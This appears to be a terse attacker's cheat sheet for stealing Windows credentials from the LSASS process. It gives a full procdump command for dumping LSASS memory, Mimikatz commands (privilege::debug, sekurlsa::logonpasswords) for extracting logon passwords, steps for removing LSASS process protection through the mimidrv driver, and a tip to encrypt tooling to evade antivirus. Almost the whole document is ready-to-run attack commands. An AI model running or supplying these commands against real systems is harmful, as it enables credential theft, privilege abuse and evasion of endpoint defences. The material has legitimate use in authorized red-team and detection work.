# DUMP LSASS PROCESS WITH TASK MANAGER (REQUIRES GUI)

#### 1) GUI (Right-click on lsass.exe in Task Manager)

#### 2) Create dump file

#### 3) Copy dump file to mimikatz folder

## Sysinternals suite (Procdump)

#### procdump.exe -accepteula -ma lsass.exe c:\tools\mimikatz\lsass_dump

## TIP: Bypass AV, write code to encrypt

## Mimikatz

#### 1) mimikatz

#### 2) privilege::debug

#### 3) sekurlsa::logonpasswords

# BYPASS LSASS PROTECTION

#### 1) mimikatz

#### 2) privilege::debug 

#### 3) !+ (Load mimidrv driver into memory)

#### 4) !processprotect /process:lsass.exe /remove

#### 5) sekurlsa::logonpasswords
